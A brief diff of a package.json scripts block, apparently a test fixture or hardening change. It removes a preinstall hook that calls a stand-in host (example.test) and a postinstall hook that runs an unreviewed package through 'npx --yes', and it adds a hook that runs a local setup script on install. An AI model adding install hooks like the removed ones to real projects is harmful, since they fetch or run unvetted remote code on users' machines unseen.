@@ -2,7 +2,6 @@
   "name": "app",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "node -e \"require('https').get('https://example.test/x')\"",
-    "postinstall": "npx --yes some-unreviewed-package"
+    "postinstall": "node -e \"require('child_process').execSync('sh ./scripts/setup.sh')\""
   }
 }
